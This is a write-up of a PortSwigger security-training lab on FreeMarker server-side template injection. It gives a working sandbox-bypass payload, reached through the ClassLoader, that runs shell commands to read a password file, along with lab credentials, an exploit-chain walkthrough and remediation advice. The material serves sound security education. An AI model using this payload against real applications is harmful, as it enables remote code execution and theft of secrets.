# Lab 6: Server-Side Template Injection in a Sandboxed Environment

**Category:** Server-Side Template Injection (SSTI)
**Difficulty:** Expert
**Lab link:** [SSTI in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

## Overview

The CMS product template editor uses FreeMarker but with the sandbox enabled — `freemarker.template.utility.Execute` cannot be instantiated directly via `?new()`. The sandbox is bypassed by using the template context's `product` object to reach its `ClassLoader`, loading `ObjectWrapper` to get a `DefaultObjectWrapper` instance, then using `newInstance()` to construct `Execute` indirectly. The goal is to read `/home/carlos/my_password.txt` and submit the contents.

**Engine:** FreeMarker (Java) — sandboxed

## Key Concepts

- **FreeMarker sandbox:** disables `?new()` for dangerous classes like `Execute`. `TemplateClassResolver.SAFER_RESOLVER` or similar is active.
- **Sandbox bypass via ClassLoader:** `product.class.protectionDomain.classLoader` gives a live `ClassLoader`. From there you can call `loadClass()` on any class on the JVM classpath — including `Execute` — bypassing the template resolver restriction.
- **`ObjectWrapper.DEFAULT_WRAPPER`:** a static field on `ObjectWrapper` holding a `DefaultObjectWrapper` instance. `DefaultObjectWrapper.newInstance(Class, List)` creates a new instance of any class, so `dwf.newInstance(Execute.class, null)` creates an `Execute` without going through `?new()`.
- **Goal is file read, not RCE delete:** `Execute` returns command stdout — use `cat` to read the password file and display it in the page.

## Solution

### Step 1 — Log in and find the injection point

Credentials: `content-manager` / `C0nt3ntM4n4g3r`. Navigate to a product → **Edit template**.

### Step 2 — Confirm sandbox is active

Try:
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```
Expected: security exception / sandbox error → confirms sandbox is enabled.

### Step 3 — Sandbox bypass payload

```freemarker
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat /home/carlos/my_password.txt")}
```

Save the template. The password renders on the product page.

### Step 4 — Submit

Click **Submit solution** and paste the password. Lab solved.

## Troubleshooting

**`forName(Module, String)` takes 2 arguments error:** this happens if you use `dwf.getClass().forName("...")` — Java resolves the wrong overload. Fix: use `classloader.loadClass("...")` instead (line 4 above).

**Empty output after save:** `rm` produces no stdout. For this lab use `cat` to get visible output. Test with `id` to confirm execution before reading the file.

## Exploit Chain Walkthrough

```
product                                     (template context variable)
  .class                                    → java.lang.Class for product's type
  .protectionDomain                         → ProtectionDomain
  .classLoader                              → ClassLoader (JVM app classloader)
  .loadClass("freemarker.template.ObjectWrapper")   → Class<ObjectWrapper>
  .getField("DEFAULT_WRAPPER")              → Field (static)
  .get(null)                                → DefaultObjectWrapper instance (dwf)

classloader.loadClass("freemarker.template.utility.Execute")  → Class<Execute>

dwf.newInstance(ec, null)                   → Execute instance
  ("cat /home/carlos/my_password.txt")      → runs command, returns stdout
```

## Remediation

- Set `new_builtin_class_resolver` to `SAFER_RESOLVER` AND restrict classloader access via `api_builtin_enabled=false`.
- Do not expose framework/JVM objects (`product.class`, etc.) in template context — wrap in a DTO that exposes only needed fields.
- Audit template context objects for any that have `.class`, `.classLoader`, or reflection access.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/server-side-template-injection/lab-06-freemarker-sandboxed/solve.py)

Logs in, injects the sandbox-bypass payload with `cat`, extracts the password from the rendered page, and submits the solution.

## Key Takeaways

- Sandbox ≠ safe: restrictions on `?new()` don't help if the ClassLoader is reachable via context objects.
- Always restrict what objects are passed into template context — not just what the template engine allows.
- `forName()` overload ambiguity in FreeMarker: use `classLoader.loadClass()` not `Class.forName()`.
- File read via `Execute("cat ...")` returns stdout inline — useful for exfiltration without a network callback.
